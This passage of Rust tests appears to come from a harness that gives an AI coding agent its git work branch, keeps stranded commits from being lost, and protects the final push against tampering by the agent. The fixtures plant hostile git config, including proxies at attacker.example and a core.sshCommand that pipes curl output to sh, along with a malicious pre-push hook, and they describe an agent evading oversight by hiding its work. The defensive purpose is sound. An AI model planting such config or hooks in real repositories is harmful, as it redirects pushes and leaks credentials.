        // The other half of the classification: with no explicit base, a
        // checkout on the conventional `main` IS the shared base and must be
        // diverted onto a fallback (never committed-and-pushed directly).
        let dir = git_workspace("conv").await; // leaves checkout on `main`
        let prep = prepare_work_branch(
            &dir,
            &test_repo(),
            None,
            None,
            true,
            "u5",
            Duration::from_secs(30),
        )
        .await;
        let branch = prep.working_branch.expect("a fallback branch is cut");
        assert!(
            branch.starts_with("nano/agent-work/"),
            "expected a fallback branch off the conventional base, got {branch:?}"
        );
        let _ = std::fs::remove_dir_all(dir_path(&dir));
    }

    #[tokio::test]
    async fn branch_cut_diverts_custom_default_branch() {
        // Regression for the custom-default-branch finding: a repo whose SHARED
        // default is neither `main`/`master` nor an explicitly-configured base
        // (e.g. `develop`) must still be recognised as a base. Otherwise a
        // checkout landing on that default is classified as a non-base PR head,
        // kept as the work branch, and finalize pushes the agent's commits
        // straight onto the shared default — the exact hazard the guard prevents.
        let dir = git_workspace("custom-default").await;
        let t = Duration::from_secs(30);
        // Put the checkout on `develop` and mark it the remote default via the
        // local `origin/HEAD` symref (what an ordinary clone of such a repo
        // leaves behind).
        git(
            &["checkout".into(), "-B".into(), "develop".into(), "--".into()],
            Some(&dir),
            t,
            None,
        )
        .await
        .unwrap();
        git(
            &[
                "symbolic-ref".into(),
                "refs/remotes/origin/HEAD".into(),
                "refs/remotes/origin/develop".into(),
            ],
            Some(&dir),
            t,
            None,
        )
        .await
        .unwrap();
        let prep = prepare_work_branch(
            &dir,
            &test_repo(), // no base_ref, no branch.base — only the remote default names it
            None,
            None,
            true,
            "u-cd",
            t,
        )
        .await;
        let branch = prep
            .working_branch
            .expect("a fallback branch is cut off the custom default");
        assert!(
            branch.starts_with("nano/agent-work/"),
            "the custom default `develop` must be diverted onto a fallback, got {branch:?}"
        );
        let on = git(
            &["rev-parse".into(), "--abbrev-ref".into(), "HEAD".into()],
            Some(&dir),
            t,
            None,
        )
        .await
        .unwrap();
        assert_eq!(on.trim(), branch, "the checkout must move onto the fallback");
        assert_ne!(on.trim(), "develop", "the shared default must never stay the work branch");
        let _ = std::fs::remove_dir_all(dir_path(&dir));
    }

    #[tokio::test]
    async fn remote_contains_branch_tip_confirms_and_denies_publication() {
        // Regression for the uncertain-push finding: after a push error, finalize
        // must consult the trusted remote rather than blindly reporting
        // `pushed = false`. An equal remote tip means the branch is durable
        // (`Some(true)`); an absent remote branch means it is not (`Some(false)`).
        let dir = git_workspace("verify-push").await;
        let t = Duration::from_secs(30);
        git(
            &["checkout".into(), "-B".into(), "feat/work".into(), "--".into()],
            Some(&dir),
            t,
            None,
        )
        .await
        .unwrap();
        commit(&dir, "durable work").await;
        let bare = std::env::temp_dir().join(format!(
            "nano-bare-verify-{}-{}",
            std::process::id(),
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_nanos()
        ));
        git(
            &[
                "init".into(),
                "--bare".into(),
                "--".into(),
                bare.to_string_lossy().into_owned(),
            ],
            Some(&dir),
            t,
            None,
        )
        .await
        .unwrap();
        let url = format!("file://{}", bare.display());
        // Before the branch exists on the remote: not published.
        assert_eq!(
            remote_contains_branch_tip(&dir, &[], &url, "feat/work", None, t).await,
            Some(false),
            "an absent remote branch must report not-published"
        );
        // Publish it out of band (standing in for a push whose response was lost).
        git(
            &[
                "push".into(),
                "--".into(),
                url.clone(),
                "refs/heads/feat/work:refs/heads/feat/work".into(),
            ],
            Some(&dir),
            t,
            None,
        )
        .await
        .unwrap();
        assert_eq!(
            remote_contains_branch_tip(&dir, &[], &url, "feat/work", None, t).await,
            Some(true),
            "an equal remote tip must confirm the push landed despite the error"
        );
        let _ = std::fs::remove_dir_all(dir_path(&dir));
        let _ = std::fs::remove_dir_all(&bare);
    }

    /// Init a fresh local bare repo and return a `test_repo()` whose `url` points
    /// at it, so the finalize push actually SUCCEEDS. Scan/retain tests use this
    /// to isolate the scan's `retain` decision from the push outcome: an
    /// unreachable URL now (correctly) retains on an unverifiable push failure,
    /// which would otherwise mask what those tests assert. Returns `(repo, bare)`;
    /// the caller removes `bare`.
    async fn repo_with_reachable_remote(dir: &CwdHandle) -> (crate::envelope::Repository, PathBuf) {
        let bare = std::env::temp_dir().join(format!(
            "nano-bare-reach-{}-{}",
            std::process::id(),
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_nanos()
        ));
        git(
            &[
                "init".into(),
                "--bare".into(),
                "--".into(),
                bare.to_string_lossy().into_owned(),
            ],
            Some(dir),
            Duration::from_secs(30),
            None,
        )
        .await
        .unwrap();
        let mut repo = test_repo();
        repo.url = format!("file://{}", bare.display());
        (repo, bare)
    }

    /// Commit a new empty commit on the current branch of `dir`.
    async fn commit(dir: &CwdHandle, msg: &str) {
        git(
            &[
                "-c".into(),
                "user.email=t@t".into(),
                "-c".into(),
                "user.name=t".into(),
                "commit".into(),
                "--allow-empty".into(),
                "-m".into(),
                msg.into(),
            ],
            Some(dir),
            Duration::from_secs(30),
            None,
        )
        .await
        .unwrap();
    }

    #[tokio::test]
    async fn finalize_enumerates_work_branch_not_head() {
        // Commit discovery is anchored to the prepared work branch, not to
        // wherever the agent left HEAD: a commit made on the work branch while
        // HEAD sits elsewhere is still enumerated for the push.
        let dir = git_workspace("fin-head").await;
        let prep = prepare_work_branch(
            &dir,
            &test_repo(),
            None,
            Some("feat/work"),
            true,
            "u6",
            Duration::from_secs(30),
        )
        .await;
        assert_eq!(prep.working_branch.as_deref(), Some("feat/work"));
        // Commit on the work branch, then move HEAD away to a detached state.
        commit(&dir, "work").await;
        let sha = git(
            &["rev-parse".into(), "HEAD".into()],
            Some(&dir),
            Duration::from_secs(30),
            None,
        )
        .await
        .unwrap();
        let sha = sha.trim().to_string();
        // Detach HEAD at the base commit so HEAD no longer names the work tip.
        git(
            &["checkout".into(), "--detach".into(), "HEAD~1".into()],
            Some(&dir),
            Duration::from_secs(30),
            None,
        )
        .await
        .unwrap();
        let res = finalize_git(&dir, &prep, &test_repo(), Duration::from_secs(30)).await;
        assert!(
            res.commits.iter().any(|c| c == &sha),
            "finalize must enumerate the work-branch commit even when HEAD moved, got {:?}",
            res.commits
        );
        let _ = std::fs::remove_dir_all(dir_path(&dir));
    }

    #[tokio::test]
    async fn finalize_flags_unpublished_side_branch_work() {
        // If the agent commits on a branch OTHER than the prepared work branch,
        // finalize must not report a clean push (which would let the run dir be
        // reaped with the only copy of that work). It surfaces the stranded
        // work by reporting no push and no commits.
        let dir = git_workspace("fin-side").await;
        let prep = prepare_work_branch(
            &dir,
            &test_repo(),
            None,
            Some("feat/work"),
            true,
            "u7",
            Duration::from_secs(30),
        )
        .await;
        assert_eq!(prep.working_branch.as_deref(), Some("feat/work"));
        // The agent creates a side branch off the work branch and commits there.
        git(
            &[
                "checkout".into(),
                "-B".into(),
                "feat/side".into(),
                "--".into(),
            ],
            Some(&dir),
            Duration::from_secs(30),
            None,
        )
        .await
        .unwrap();
        commit(&dir, "side work").await;
        // Back on the work branch, which has no new commit of its own.
        git(
            &["checkout".into(), "feat/work".into(), "--".into()],
            Some(&dir),
            Duration::from_secs(30),
            None,
        )
        .await
        .unwrap();
        let res = finalize_git(&dir, &prep, &test_repo(), Duration::from_secs(30)).await;
        assert!(
            !res.pushed,
            "side-branch work must not be reported as pushed (run dir must be retained)"
        );
        assert!(
            res.commits.is_empty(),
            "side-branch work must not be reported as work-branch commits, got {:?}",
            res.commits
        );
        assert!(
            res.retain,
            "side-branch work must set the explicit retain flag (final HEAD is unchanged, so the \
             HEAD compare alone would reap the only copy)"
        );
        let _ = std::fs::remove_dir_all(dir_path(&dir));
    }

    #[tokio::test]
    async fn finalize_flags_stranded_detached_head_commit() {
        // A commit made on a DETACHED HEAD and then abandoned (by switching back
        // to the work branch) is reachable only through the HEAD reflog — the
        // `refs/heads/` sweep cannot see it. Finalize must still flag retain so
        // the run dir holding the only copy is not reaped.
        let dir = git_workspace("fin-detached").await;
        let prep = prepare_work_branch(
            &dir,
            &test_repo(),
            None,
            Some("feat/work"),
            true,
            "u9",
            Duration::from_secs(30),
        )
        .await;
        assert_eq!(prep.working_branch.as_deref(), Some("feat/work"));
        // The agent detaches HEAD, commits there, then switches back — leaving
        // the commit reachable from no branch.
        git(
            &["checkout".into(), "--detach".into(), "HEAD".into()],
            Some(&dir),
            Duration::from_secs(30),
            None,
        )
        .await
        .unwrap();
        commit(&dir, "stranded detached work").await;
        git(
            &["checkout".into(), "feat/work".into(), "--".into()],
            Some(&dir),
            Duration::from_secs(30),
            None,
        )
        .await
        .unwrap();
        let res = finalize_git(&dir, &prep, &test_repo(), Duration::from_secs(30)).await;
        assert!(
            res.retain,
            "a stranded detached-HEAD commit must set retain (the reflog scan finds it)"
        );
        let _ = std::fs::remove_dir_all(dir_path(&dir));
    }

    #[tokio::test]
    async fn finalize_flags_commit_on_preexisting_divergent_branch() {
        // Finding (ancestor-check misclassification): the agent detaches at a
        // PRE-EXISTING branch whose history DIVERGED from the work base (it is
        // not a descendant of `start_sha`), commits there, then abandons it.
        // The old `merge-base(start, h) == start` test returned the fork point,
        // not `start`, so it classified the new commit as pre-existing and let
        // its only copy be reaped. Reachability from the provision-time ref tips
        // must instead flag it as agent work and retain.
        let dir = git_workspace("fin-divergent").await;
        // Build a branch `legacy` that forks from the ROOT commit, so its tip is
        // NOT a descendant of what will become the work base.
        git(
            &["branch".into(), "legacy".into()],
            Some(&dir),
            Duration::from_secs(30),
            None,
        )
        .await
        .unwrap();
        // Advance `main` so the work base diverges from `legacy`.
        commit(&dir, "main advances past the fork").await;
        git(
            &["checkout".into(), "legacy".into(), "--".into()],
            Some(&dir),
            Duration::from_secs(30),
            None,
        )
        .await
        .unwrap();
        commit(&dir, "legacy diverges").await;
        git(
            &["checkout".into(), "main".into(), "--".into()],
            Some(&dir),
            Duration::from_secs(30),
            None,
        )
        .await
        .unwrap();
        // Provision now snapshots `main` AND the pre-existing divergent `legacy`.
        let prep = prepare_work_branch(
            &dir,
            &test_repo(),
            None,
            Some("feat/work"),
            true,
            "u13",
            Duration::from_secs(30),
        )
        .await;
        assert_eq!(prep.working_branch.as_deref(), Some("feat/work"));
        let legacy_tip = git(
            &["rev-parse".into(), "legacy".into()],
            Some(&dir),
            Duration::from_secs(30),
            None,
        )
        .await
        .unwrap();
        // Agent detaches at the pre-existing divergent tip, commits a NEW commit
        // there (a child of a non-descendant of the base), then abandons it by
        // switching back and deleting the branch.
        git(
            &["checkout".into(), "--detach".into(), legacy_tip.trim().into()],
            Some(&dir),
            Duration::from_secs(30),
            None,
        )
        .await
        .unwrap();
        commit(&dir, "stranded work atop a divergent base").await;
        git(
            &["checkout".into(), "feat/work".into(), "--".into()],
            Some(&dir),
            Duration::from_secs(30),
            None,
        )
        .await
        .unwrap();
        git(
            &["branch".into(), "-D".into(), "legacy".into()],
            Some(&dir),
            Duration::from_secs(30),
            None,
        )
        .await
        .unwrap();
        let res = finalize_git(&dir, &prep, &test_repo(), Duration::from_secs(30)).await;
        assert!(
            res.retain,
            "a commit the agent made atop a pre-existing DIVERGENT branch must set retain — the \
             start-ancestor test misses it; reachability from provision-time tips catches it"
        );
        assert!(
            res.work_found,
            "the stranded divergent-base commit is real work, so work_found must be set"
        );
        let _ = std::fs::remove_dir_all(dir_path(&dir));
    }

    #[tokio::test]
    async fn finalize_fails_closed_when_reflog_expired_below_provisioning() {
        // Finding (reflog truncation): an agent can expire HEAD's reflog after
        // abandoning a detached commit. The reflog then no longer reaches back
        // to the provision-time HEAD, so the net cannot prove no detached work
        // was stranded. It must fail closed (retain) rather than read the empty
        // reflog as "nothing stranded" and let the only copy be reaped.
        let dir = git_workspace("fin-reflog-expired").await;
        let prep = prepare_work_branch(
            &dir,
            &test_repo(),
            None,
            Some("feat/work"),
            true,
            "u14",
            Duration::from_secs(30),
        )
        .await;
        assert_eq!(prep.working_branch.as_deref(), Some("feat/work"));
        git(
            &["checkout".into(), "--detach".into(), "HEAD".into()],
            Some(&dir),
            Duration::from_secs(30),
            None,
        )
        .await
        .unwrap();
        commit(&dir, "stranded detached work the agent then hides").await;
        git(
            &["checkout".into(), "feat/work".into(), "--".into()],
            Some(&dir),
            Duration::from_secs(30),
            None,
        )
        .await
        .unwrap();
        // The agent expires every reflog, erasing the provision-time anchor (and
        // the abandoned commit's reflog entries) from the HEAD reflog.
        git(
            &[
                "reflog".into(),
                "expire".into(),
                "--expire=now".into(),
                "--expire-unreachable=now".into(),
                "--all".into(),
            ],
            Some(&dir),
            Duration::from_secs(30),
            None,
        )
        .await
        .unwrap();
        let res = finalize_git(&dir, &prep, &test_repo(), Duration::from_secs(30)).await;
        assert!(
            res.retain,
            "an expired reflog no longer reaches provisioning, so the detached-commit scan is \
             incomplete and finalize must fail closed (retain)"
        );
        let _ = std::fs::remove_dir_all(dir_path(&dir));
    }

    #[tokio::test]
    async fn finalize_clean_work_branch_commit_does_not_retain() {
        // The happy path: the agent commits on the work branch and nothing is
        // stranded. No scan fails and no detached/side work exists, so `retain`
        // must stay false — otherwise every healthy run would be retained.
        let dir = git_workspace("fin-clean").await;
        let prep = prepare_work_branch(
            &dir,
            &test_repo(),
            None,
            Some("feat/work"),
            true,
            "u10",
            Duration::from_secs(30),
        )
        .await;
        assert_eq!(prep.working_branch.as_deref(), Some("feat/work"));
        commit(&dir, "real work").await;
        let (repo, bare) = repo_with_reachable_remote(&dir).await;
        let res = finalize_git(&dir, &prep, &repo, Duration::from_secs(30)).await;
        assert_eq!(res.commits.len(), 1, "the work-branch commit is enumerated");
        assert!(res.pushed, "the clean work branch pushes to the reachable remote");
        assert!(
            !res.retain,
            "a clean run with all work on the pushed branch must not be flagged retain"
        );
        let _ = std::fs::remove_dir_all(dir_path(&dir));
        let _ = std::fs::remove_dir_all(&bare);
    }

    #[tokio::test]
    async fn finalize_retains_stashed_work() {
        // Finding: `git stash` parks WIP commits under `refs/stash` while HEAD
        // stays put, so neither the `refs/heads` side-branch sweep nor the
        // HEAD-reflog net sees them. Without the non-head-ref net the run
        // completes "clean" and is reaped with the only copy of the stash.
        let dir = git_workspace("fin-stash").await;
        let t = Duration::from_secs(30);
        // Read-only run (no push) so the test isolates the stash net from the
        // push path; the work branch is still prepared.
        let prep =
            prepare_work_branch(&dir, &test_repo(), None, Some("feat/work"), false, "ust", t).await;
        assert_eq!(prep.working_branch.as_deref(), Some("feat/work"));
        // Track a file on the branch, then stash a WIP modification.
        std::fs::write(dir_path(&dir).join("f.txt"), "v1\n").unwrap();
        git(&["add".into(), ".".into(), "--".into()], Some(&dir), t, None)
            .await
            .unwrap();
        commit(&dir, "add tracked file").await;
        std::fs::write(dir_path(&dir).join("f.txt"), "v2 WIP — the stash holds the only copy\n").unwrap();
        git(
            &[
                "-c".into(),
                "user.email=t@t".into(),
                "-c".into(),
                "user.name=t".into(),
                "stash".into(),
                "push".into(),
                "-m".into(),
                "wip".into(),
            ],
            Some(&dir),
            t,
            None,
        )
        .await
        .unwrap();
        let res = finalize_git(&dir, &prep, &test_repo(), t).await;
        assert!(
            res.retain,
            "stashed WIP is stranded agent work; finalize must retain"
        );
        assert!(res.work_found, "the stash net records that real work exists");
        let _ = std::fs::remove_dir_all(dir_path(&dir));
    }

    #[tokio::test]
    async fn finalize_retains_tag_pinned_abandoned_commit() {
        // A tag can pin a commit the agent made and abandoned WITHOUT ever moving
        // HEAD (here built with `commit-tree`), so the HEAD-reflog net never sees
        // it and the `refs/heads` sweep (branches only) misses it. The
        // non-head-ref net must retain it.
        let dir = git_workspace("fin-tag").await;
        let t = Duration::from_secs(30);
        let prep =
            prepare_work_branch(&dir, &test_repo(), None, Some("feat/work"), false, "utg", t).await;
        let tree = git(&["rev-parse".into(), "HEAD^{tree}".into()], Some(&dir), t, None)
            .await
            .unwrap()
            .trim()
            .to_string();
        let newsha = git(
            &[
                "-c".into(),
                "user.email=t@t".into(),
                "-c".into(),
                "user.name=t".into(),
                "commit-tree".into(),
                tree,
                "-p".into(),
                "HEAD".into(),
                "-m".into(),
                "tag-only stranded work".into(),
            ],
            Some(&dir),
            t,
            None,
        )
        .await
        .unwrap()
        .trim()
        .to_string();
        git(&["tag".into(), "v-keep".into(), newsha.clone()], Some(&dir), t, None)
            .await
            .unwrap();
        let res = finalize_git(&dir, &prep, &test_repo(), t).await;
        assert!(
            res.retain,
            "a tag pinning an abandoned commit is its only copy; finalize must retain"
        );
        let _ = std::fs::remove_dir_all(dir_path(&dir));
    }

    #[tokio::test]
    async fn finalize_tag_on_branch_commit_does_not_retain() {
        // A tag pointing at a commit already on the work branch strands nothing:
        // the non-head-ref net's reachability check must treat it as covered and
        // NOT over-retain the common case (proves the check is non-vacuous).
        let dir = git_workspace("fin-tag-pub").await;
        let t = Duration::from_secs(30);
        let prep =
            prepare_work_branch(&dir, &test_repo(), None, Some("feat/work"), false, "utp", t).await;
        commit(&dir, "work on the branch").await;
        git(&["tag".into(), "v-ok".into(), "HEAD".into()], Some(&dir), t, None)
            .await
            .unwrap();
        let res = finalize_git(&dir, &prep, &test_repo(), t).await;
        assert!(
            !res.retain,
            "a tag on a commit already on the work branch must not retain"
        );
        let _ = std::fs::remove_dir_all(dir_path(&dir));
    }

    #[tokio::test]
    async fn prepare_detached_head_cuts_fallback_branch_for_push() {
        // A pinned-sha/tag provision lands on a DETACHED HEAD. A push-enabled run
        // must cut a fallback branch from it so finalize has something to push,
        // rather than leaving `working_branch = None` and stranding the agent's
        // commits with `branch: null`/`pushed: false`.
        let dir = git_workspace("prep-detached").await;
        let t = Duration::from_secs(30);
        git(&["checkout".into(), "--detach".into(), "HEAD".into()], Some(&dir), t, None)
            .await
            .unwrap();
        let prep = prepare_work_branch(&dir, &test_repo(), None, None, true, "udp", t).await;
        let b = prep.working_branch.clone();
        assert!(
            b.as_deref().is_some_and(|b| b.starts_with("nano/agent-work/")),
            "a push-enabled detached provision must cut a fallback branch, got {b:?}"
        );
        let head = git(&["symbolic-ref".into(), "--short".into(), "HEAD".into()], Some(&dir), t, None)
            .await
            .unwrap();
        assert_eq!(
            head.trim(),
            b.as_deref().unwrap(),
            "HEAD is now on the fallback branch"
        );
        let _ = std::fs::remove_dir_all(dir_path(&dir));
    }

    #[tokio::test]
    async fn prepare_detached_head_read_only_cuts_no_branch() {
        // A read-only (`branch.push = false`) detached provision pushes nothing,
        // so it cuts no fallback branch; any commit the agent leaves on the
        // detached HEAD is still protected by the finalize safety nets.
        let dir = git_workspace("prep-detached-ro").await;
        let t = Duration::from_secs(30);
        git(&["checkout".into(), "--detach".into(), "HEAD".into()], Some(&dir), t, None)
            .await
            .unwrap();
        let prep = prepare_work_branch(&dir, &test_repo(), None, None, false, "udp2", t).await;
        assert!(
            prep.working_branch.is_none(),
            "a read-only detached provision cuts no branch"
        );
        let _ = std::fs::remove_dir_all(dir_path(&dir));
    }

    #[test]
    fn transport_env_preserved_only_config_injection_scrubbed() {
        // Finding: scrubbing GIT_SSH_COMMAND/GIT_SSH/GIT_ASKPASS from every git
        // child breaks operator-supplied SSH/HTTPS provisioning auth starting at
        // the very first clone. The agent cannot mutate the daemon's env, so
        // transport vars are trusted; only the config-injection channels (which
        // bypass file isolation) are scrubbed universally.
        for v in ["GIT_SSH", "GIT_SSH_COMMAND", "GIT_ASKPASS", "GIT_PROXY_COMMAND"] {
            assert!(
                !GIT_CONFIG_INJECTION_ENV.contains(&v),
                "{v} is operator-supplied transport auth and must not be scrubbed from every git child"
            );
        }
        for v in ["GIT_CONFIG", "GIT_CONFIG_COUNT", "GIT_CONFIG_PARAMETERS"] {
            assert!(
                GIT_CONFIG_INJECTION_ENV.contains(&v),
                "{v} bypasses file isolation and must stay scrubbed"
            );
        }
    }

    #[tokio::test]
    async fn finalize_push_disables_hooks_and_uses_trusted_url() {
        // The finalize push runs after arbitrary agent code controlled the
        // checkout. It must (a) disable repository hooks and (b) push to the
        // trusted configured URL, not the agent-rewritable `origin` remote. A
        // planted `pre-push` hook must NOT run, and a rewritten `origin` must NOT
        // be the push destination.
        let dir = git_workspace("fin-push").await;
        // A local bare repo stands in for the trusted origin so the push has a
        // real (hook-observing) destination.
        let bare = std::env::temp_dir().join(format!(
            "nano-bare-{}-{}",
            std::process::id(),
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_nanos()
        ));
        git(
            &[
                "init".into(),
                "--bare".into(),
                "--".into(),
                bare.to_string_lossy().into_owned(),
            ],
            Some(&dir),
            Duration::from_secs(30),
            None,
        )
        .await
        .unwrap();
        let mut repo = test_repo();
        repo.url = format!("file://{}", bare.display());
        let prep = prepare_work_branch(
            &dir,
            &repo,
            None,
            Some("feat/work"),
            true,
            "u11",
            Duration::from_secs(30),
        )
        .await;
        assert_eq!(prep.working_branch.as_deref(), Some("feat/work"));
        commit(&dir, "work to push").await;
        // Plant a pre-push hook that would exfiltrate/write a marker if it ran,
        // and rewrite `origin` to a bogus destination.
        let hooks = dir_path(&dir).join(".git").join("hooks");
        std::fs::create_dir_all(&hooks).unwrap();
        let marker = dir_path(&dir).join("pre-push-ran");
        std::fs::write(
            hooks.join("pre-push"),
            format!("#!/bin/sh\ntouch {}\nexit 1\n", marker.display()),
        )
        .unwrap();
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            std::fs::set_permissions(
                hooks.join("pre-push"),
                std::fs::Permissions::from_mode(0o755),
            )
            .unwrap();
        }
        git(
            &[
                "remote".into(),
                "add".into(),
                "origin".into(),
                "--".into(),
                "file:///nonexistent/attacker".into(),
            ],
            Some(&dir),
            Duration::from_secs(30),
            None,
        )
        .await
        .unwrap();
        let res = finalize_git(&dir, &prep, &repo, Duration::from_secs(30)).await;
        assert!(
            res.pushed,
            "the push must succeed against the trusted URL despite the planted hook and rewritten origin"
        );
        assert!(
            !marker.exists(),
            "the planted pre-push hook must NOT run during finalize's push"
        );
        // The branch must have landed on the TRUSTED (bare) remote, not the
        // rewritten origin.
        let on_remote = git(
            &[
                "--git-dir".into(),
                bare.to_string_lossy().into_owned(),
                "rev-parse".into(),
                "--verify".into(),
                "refs/heads/feat/work".into(),
            ],
            None,
            Duration::from_secs(30),
            None,
        )
        .await;
        assert!(
            on_remote.is_ok(),
            "the work branch must be pushed to the trusted configured URL"
        );
        let _ = std::fs::remove_dir_all(dir_path(&dir));
        let _ = std::fs::remove_dir_all(&bare);
    }

    #[tokio::test]
    async fn finalize_does_not_condemn_fallback_for_preexisting_base_branch() {
        // Regression for a false positive in the off-branch safety net: a
        // fallback work branch (`nano/agent-work/main-*`) is created off `main`,
        // so once the agent commits on the fallback the PRE-EXISTING local
        // `main` is "ahead" of it (`fallback..main` counts the base tip the
        // fallback lacks after any base advance, and is trivially non-empty
        // against a same-tip fallback). The net must only flag branches the
        // agent created and committed on AFTER provisioning — never the base —
        // or every fallback run would be wrongly retained as "unpublished".
        let dir = git_workspace("fin-base").await; // checkout on `main`
        let prep = prepare_work_branch(
            &dir,
            &test_repo(),
            None,
            None,
            true,
            "u8",
            Duration::from_secs(30),
        )
        .await;
        let branch = prep
            .working_branch
            .clone()
            .expect("a fallback branch is cut off main");
        assert!(branch.starts_with("nano/agent-work/"));
        // Agent commits on the fallback work branch; the local `main` is left
        // behind (and would be "ahead" of the fallback under a naive count).
        commit(&dir, "real work").await;
        let res = finalize_git(&dir, &prep, &test_repo(), Duration::from_secs(30)).await;
        assert_eq!(
            res.commits.len(),
            1,
            "the work-branch commit is enumerated, got {:?}",
            res.commits
        );
        // The pre-existing `main` must NOT be mistaken for stranded agent work.
        // (push is attempted to a non-existent origin and fails, so `pushed` is
        // false — but crucially NOT because the net cleared `commits`.)
        assert!(
            !res.commits.is_empty(),
            "the base branch must not trip the off-branch net"
        );
        let _ = std::fs::remove_dir_all(dir_path(&dir));
    }

    #[tokio::test]
    async fn finalize_push_neutralizes_insteadof_rewrite() {
        // The finalize push hands git the trusted `fetch_url` positionally, but
        // git still applies a local `url.<attacker>.insteadOf = <fetch_url>`
        // rewrite to it — silently redirecting the push off-box. finalize must
        // strip that agent-planted rewrite first, so the push lands on the
        // TRUSTED destination despite the rewrite.
        let dir = git_workspace("fin-insteadof").await;
        let bare = std::env::temp_dir().join(format!(
            "nano-bare-io-{}-{}",
            std::process::id(),
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_nanos()
        ));
        git(
            &[
                "init".into(),
                "--bare".into(),
                "--".into(),
                bare.to_string_lossy().into_owned(),
            ],
            Some(&dir),
            Duration::from_secs(30),
            None,
        )
        .await
        .unwrap();
        let mut repo = test_repo();
        let trusted = format!("file://{}", bare.display());
        repo.url = trusted.clone();
        let prep = prepare_work_branch(
            &dir,
            &repo,
            None,
            Some("feat/work"),
            true,
            "u12",
            Duration::from_secs(30),
        )
        .await;
        assert_eq!(prep.working_branch.as_deref(), Some("feat/work"));
        commit(&dir, "work to push").await;
        // Agent plants an `insteadOf` rewrite in LOCAL config that would redirect
        // the trusted URL to a bogus (nonexistent) attacker destination. The
        // attacker base carries no dots so the config subsection parses cleanly.
        git(
            &[
                "config".into(),
                "--local".into(),
                "url.file:///nonexistent/attacker.insteadOf".into(),
                trusted.clone(),
            ],
            Some(&dir),
            Duration::from_secs(30),
            None,
        )
        .await
        .unwrap();
        // Also hide one behind a local include file, to prove the include
        // directive is dropped too.
        let inc = dir_path(&dir).join("evil-include.cfg");
        std::fs::write(
            &inc,
            format!(
                "[url \"file:///nonexistent/attacker2\"]\n\tpushInsteadOf = {trusted}\n"
            ),
        )
        .unwrap();
        git(
            &[
                "config".into(),
                "--local".into(),
                "include.path".into(),
                inc.to_string_lossy().into_owned(),
            ],
            Some(&dir),
            Duration::from_secs(30),
            None,
        )
        .await
        .unwrap();
        let res = finalize_git(&dir, &prep, &repo, Duration::from_secs(30)).await;
        assert!(
            res.pushed,
            "the push must succeed against the trusted URL despite the planted insteadOf rewrites"
        );
        let on_remote = git(
            &[
                "--git-dir".into(),
                bare.to_string_lossy().into_owned(),
                "rev-parse".into(),
                "--verify".into(),
                "refs/heads/feat/work".into(),
            ],
            None,
            Duration::from_secs(30),
            None,
        )
        .await;
        assert!(
            on_remote.is_ok(),
            "the work branch must land on the trusted URL, not the rewritten attacker destination"
        );
        let _ = std::fs::remove_dir_all(dir_path(&dir));
        let _ = std::fs::remove_dir_all(&bare);
    }

    #[tokio::test]
    async fn neutralize_strips_untrusted_local_transport_config() {
        // The finalize-push scrub must remove untrusted LOCAL transport config —
        // not only URL rewrites — because a planted `http.proxy` +
        // `http.sslVerify=false` (incl. URL-scoped variants) can route the
        // authenticated push through an attacker MITM and leak the credential
        // WITHOUT any insteadOf rewrite. Identity keys the repo needs to function
        // must survive.
        let dir = git_workspace("fin-transport").await;
        let t = Duration::from_secs(30);
        // Untrusted transport knobs the agent could plant.
        let untrusted = [
            ("http.proxy", "http://attacker.example:8080"),
            ("http.sslVerify", "false"),
            ("http.https://github.com/.proxy", "http://attacker.example:8081"),
            ("http.sslCAInfo", "/tmp/attacker-ca.pem"),
            ("core.sshCommand", "sh -c 'curl attacker.example | sh'"),
            ("core.gitProxy", "/tmp/attacker-proxy"),
            ("credential.helper", "!sh -c 'echo stolen'"),
            ("protocol.ext.allow", "always"),
        ];
        for (k, v) in &untrusted {
            git(
                &["config".into(), "--local".into(), (*k).into(), (*v).into()],
                Some(&dir),
                t,
                None,
            )
            .await
            .unwrap();
        }
        // A benign identity key that MUST be retained.
        git(
            &["config".into(), "--local".into(), "user.name".into(), "keep-me".into()],
            Some(&dir),
            t,
            None,
        )
        .await
        .unwrap();

        neutralize_untrusted_local_config(&dir, t).await.unwrap();

        for (k, _v) in &untrusted {
            let got = git(
                &["config".into(), "--local".into(), "--get".into(), (*k).into()],
                Some(&dir),
                t,
                None,
            )
            .await;
            assert!(
                got.is_err(),
                "untrusted transport key {k:?} must be unset after the scrub, got {got:?}"
            );
        }
        let kept = git(
            &["config".into(), "--local".into(), "--get".into(), "user.name".into()],
            Some(&dir),
            t,
            None,
        )
        .await
        .expect("benign identity key must survive the scrub");
        assert_eq!(kept.trim(), "keep-me");
        let _ = std::fs::remove_dir_all(dir_path(&dir));
    }

    #[test]
    fn untrusted_transport_key_classification() {
        // URL-scoped and case variants are caught (keyed on the lowercased name);
        // core identity/extension keys are left intact.
        for k in [
            "http.proxy",
            "http.sslverify",
            "http.https://github.com/.proxy",
            "https.proxy",
            "core.sshcommand",
            "core.askpass",
            "core.gitproxy",
            "core.fsmonitor",
            "protocol.ext.allow",
            "credential.helper",
        ] {
            assert!(is_untrusted_transport_key(k), "{k} must be untrusted");
        }
        for k in [
            "core.bare",
            "core.repositoryformatversion",
            "extensions.objectformat",
            "user.name",
            "remote.origin.url",
        ] {
            assert!(!is_untrusted_transport_key(k), "{k} must be trusted");
        }
    }

    #[tokio::test]
    async fn drain_capped_reports_truncation() {
        // Fail-closed primitive: the capture flag is true iff leading bytes were
        // dropped, so a security scrub can refuse to act on a partial listing.
        let (out, trunc) = drain_capped(&b"abcdef"[..], 10).await;
        assert_eq!(out, b"abcdef");
        assert!(!trunc, "a stream within the cap is not truncated");
        let (out, trunc) = drain_capped(&b"abcdefghij"[..], 10).await;
        assert_eq!(out, b"abcdefghij");
        assert!(!trunc, "a stream exactly at the cap is not truncated");
        let (out, trunc) = drain_capped(&b"abcdefghijk"[..], 10).await;
        assert_eq!(out, b"bcdefghijk", "only the last `cap` bytes are retained");
        assert!(trunc, "a stream over the cap reports truncation");
    }

    #[tokio::test]
    async fn neutralize_fails_closed_on_truncated_config() {
        // An agent can bury a rewrite near the START of `.git/config` and pad the
        // file past the captured stdout tail so `--list` drops the rewrite from
        // the tail. The scrub must FAIL CLOSED (Err) on a truncated listing
